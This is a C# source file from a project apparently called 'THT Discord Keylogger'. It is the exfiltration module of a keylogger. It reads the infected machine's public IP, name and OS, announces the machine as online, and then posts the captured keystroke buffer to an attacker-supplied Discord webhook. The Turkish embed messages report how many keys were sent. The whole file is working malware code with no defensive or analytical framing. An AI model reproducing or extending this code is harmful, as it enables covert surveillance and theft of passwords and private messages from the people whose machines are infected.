using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Text;
using System.Threading.Tasks;

namespace THT_Discord_Keylogger
{
    class Discord
    {
        public string webhook, username, os, public_ip, machine_name;
        public int color;
        public HttpClient httpClient;
        public Discord(string webhook, string username, string machine_name, string os, int color)
        {
            this.webhook = webhook;
            this.username = username;
            this.color = color;
            this.os = os;
            this.public_ip = get_public_ip();
            this.machine_name = machine_name;
            httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.Clear();
            httpClient.DefaultRequestHeaders.Add("Accept", "*/*");
            httpClient.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
            httpClient.DefaultRequestHeaders.Add("Connection", "close");
        }

        public static string get_public_ip()
        {  
            try
            {
                Task<string> task;
                task = new HttpClient().GetStringAsync("https://api.ipify.org");
                task.Wait();
                return task.Result;
            } catch
            {
                return null;
            };          
        }

        public Task<HttpResponseMessage> become_online()
        {
            string timestamp = DateTime.Now.ToString("yyyy-MM-ddThh:mm:ssZ");
            string json = "{\"embeds\":[{\"title\":\":computer: :eyes: Makine Online Oldu!\", \"description\":\"**Makinenin keylogging sistemi aktif!\\n\\n`Makine: " +
                this.machine_name + "\\nIP: " + this.public_ip + "\\nOS: " + this.os + "`**\", \"timestamp\":\"" + timestamp + "\", \"color\":" + this.color + ",\"footer\":{\"text\":\"THT Discord Keylogger |\",\"icon_url\":\"https://i.hizliresim.com/G0mWE2.png\"}}],\"username\":\"" + this.username + "\"}";

            var content = new StringContent(json, Encoding.UTF8, "application/json");

            return httpClient.PostAsync(this.webhook, content);
        }

        public Task<HttpResponseMessage> send()
        {
            string timestamp = DateTime.Now.ToString("yyyy-MM-ddThh:mm:ssZ");
            string json = "{\"embeds\":[{\"title\":\":keyboard: :eyes: Makine Yeni Guncelleme Getirdi!\", \"description\":\"**:white_check_mark: Makine depoladigi `" + KeyboardHook.key_count.ToString() + "` tusu gonderdi!\\n\\n`Makine: " +
                machine_name + "\\nIP: " + public_ip + "\\nOS: " + os + "`**\\n\\n```asciidoc\\n" + KeyboardHook.key_buffer + "```\", \"timestamp\":\"" + timestamp + "\", \"color\":" + color + ",\"footer\":{\"text\":\"THT Discord Keylogger |\",\"icon_url\":\"https://i.hizliresim.com/G0mWE2.png\"}}],\"username\":\"" + username + "\"}";

            var content = new StringContent(json, Encoding.UTF8, "application/json");

            return httpClient.PostAsync(this.webhook, content);
        }
    }
}
